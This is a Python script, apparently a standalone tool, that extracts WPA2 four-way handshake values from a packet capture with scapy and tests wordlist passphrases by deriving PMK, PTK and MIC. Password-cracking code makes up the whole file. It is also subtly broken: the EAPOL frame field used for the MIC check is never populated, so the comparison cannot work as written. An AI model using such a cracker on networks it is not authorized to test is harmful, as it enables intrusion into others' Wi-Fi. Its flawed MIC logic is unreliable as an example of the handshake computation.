import sys
import hmac
import hashlib
import binascii
import os
import argparse
from pbkdf2 import PBKDF2
from scapy.all import rdpcap, EAPOL, Dot11Beacon
from colorama import Fore, Style, init

init(autoreset=True)

# Color Definitions
MAGENTA = Fore.MAGENTA
CYAN = Fore.CYAN
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
RED = Fore.RED
WHITE = Fore.WHITE
RESET = Style.RESET_ALL
BOLD = Style.BRIGHT

class WPA2Handshake:
    ssid = ''
    macAP = ''
    macCli = ''
    anonce = ''
    snonce = ''
    mic = ''
    Eapol2frame = ''

def extract_mic_and_nonce_and_ssid(input_file):
    packets = rdpcap(input_file)
    
    snonce = None
    mic = None
    sta_mac = None
    bssid = None
    anonce = None
    ssid = None

    for packet in packets:
        if packet.haslayer(EAPOL):
            eapol_layer = packet.getlayer(EAPOL)
            # Check if it's a Key (Message 2 of 4)
            if eapol_layer.type == 3 and eapol_layer.key_mic and not mic:
                mic = eapol_layer.key_mic
                WPA2Handshake.mic = mic.hex()
                print(f"{GREEN}Extracted MIC: {mic.hex()}{RESET}")
                if not snonce:
                    snonce = eapol_layer.key_nonce
                    WPA2Handshake.snonce = snonce.hex()
                    print(f"{GREEN}Extracted SNonce: {snonce.hex()}{RESET}")

            # Check if it's a Key (Message 3 of 4) to extract ANonce
            if eapol_layer.type == 3 and eapol_layer.key_ack and not anonce:
                anonce = eapol_layer.key_nonce
                WPA2Handshake.anonce = anonce.hex()
                print(f"{GREEN}Extracted ANonce: {anonce.hex()}{RESET}")

            # Extract STA MAC and BSSID
            if not sta_mac or not bssid:
                sta_mac = packet.addr2
                WPA2Handshake.macCli = sta_mac
                bssid = packet.addr1
                WPA2Handshake.macAP = bssid
                print(f"{GREEN}Extracted STA MAC: {sta_mac}{RESET}")
                print(f"{GREEN}Extracted BSSID: {bssid}{RESET}")

            # Break the loop if all values are found
            if mic and snonce and sta_mac and bssid and anonce:
                break

        # Extract SSID from Beacon packets
        if packet.haslayer(Dot11Beacon) and not ssid:
            ssid = packet.info.decode()
            WPA2Handshake.ssid = ssid
            print(f"{GREEN}Extracted SSID: {ssid}{RESET}")

    if not snonce:
        print(f"{RED}No SNonce found in Message 2 of 4.{RESET}")
    if not mic:
        print(f"{RED}No MIC found.{RESET}")
    if not sta_mac:
        print(f"{RED}No STA MAC found.{RESET}")
    if not bssid:
        print(f"{RED}No BSSID found.{RESET}")
    if not anonce:
        print(f"{RED}No ANonce found in Message 3 of 4.{RESET}")
    if not ssid:
        print(f"{RED}No SSID found.{RESET}")

def calculate_pmk(passphrase, ssid):
    PMK = PBKDF2(passphrase, ssid, 4096).read(32)
    print(f"{BOLD}{WHITE}###{RED} PMK Result:\\n{RESET}")
    print(f"{GREEN}PMK (Pairwise Master Key): {PMK.hex()}{RESET}")
    return PMK

def customPRF512(pmk, text, key_data):
    c = 0
    block = 64
    result = bytes()
    while c <= ((block * 8 + 159) / 160):
        hmacsha1 = hmac.new(pmk, text + chr(0x00).encode() + key_data + chr(c).encode(), hashlib.sha1)
        result += hmacsha1.digest()
        c += 1
    return result[:block]

def generate_ptk(PMK):
    macAPparsed = WPA2Handshake.macAP.replace(":", "").lower()
    macAPparsed = binascii.a2b_hex(macAPparsed)
    macCliparsed = WPA2Handshake.macCli.replace(":", "").lower()
    macCliparsed = binascii.a2b_hex(macCliparsed)
    anoncep = binascii.a2b_hex(WPA2Handshake.anonce)
    snoncep = binascii.a2b_hex(WPA2Handshake.snonce)
    key_data = min(macAPparsed, macCliparsed) + max(macAPparsed, macCliparsed) + min(anoncep, snoncep) + max(anoncep, snoncep)
    txt = b"Pairwise key expansion"
    PTK = customPRF512(PMK, txt, key_data)
    print(f"{GREEN}Pairwise Temporal Key (PTK): {PTK.hex()}{RESET}")
    return PTK

def calculate_mic(ptk, eapol_frame):
    KCK = ptk[0:16]
    eapol2data = WPA2Handshake.Eapol2frame[:162] + (32 * "0") + WPA2Handshake.Eapol2frame[194:]
    calculated_mic = hmac.new(KCK, binascii.a2b_hex(eapol2data), hashlib.sha1).digest()[:16]
    return calculated_mic

def checkPasswd(passphrase):
    PMK = calculate_pmk(passphrase, WPA2Handshake.ssid)
    PTK = generate_ptk(PMK)
    calculated_mic = calculate_mic(PTK, WPA2Handshake.Eapol2frame)
    print(f"{BOLD}Current Passphrase: {passphrase}{RESET}")
    print(f"{BOLD}Master Key: {PMK.hex()}{RESET}")
    print(f"{BOLD}Transient Key: {PTK.hex()}{RESET}")
    print(f"{BOLD}EAPOL HMAC: {calculated_mic.hex()}{RESET}")
    if calculated_mic.hex() == WPA2Handshake.mic:
        print(f"{GREEN}KEY FOUND! [{passphrase}]{RESET}")
    else:
        print(f"{RED}Password Incorrect{RESET}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="WPA2 4-way Handshake Cracker")
    parser.add_argument("capture_file", help="Path to the capture file (.cap/.pcap)")
    parser.add_argument("-P", "--wordlist", required=True, help="Path to the wordlist file")
    args = parser.parse_args()

    extract_mic_and_nonce_and_ssid(args.capture_file)

    with open(args.wordlist, 'r', encoding='latin-1') as wordlist_file:
        for passphrase in wordlist_file:
            passphrase = passphrase.strip()
            checkPasswd(passphrase)
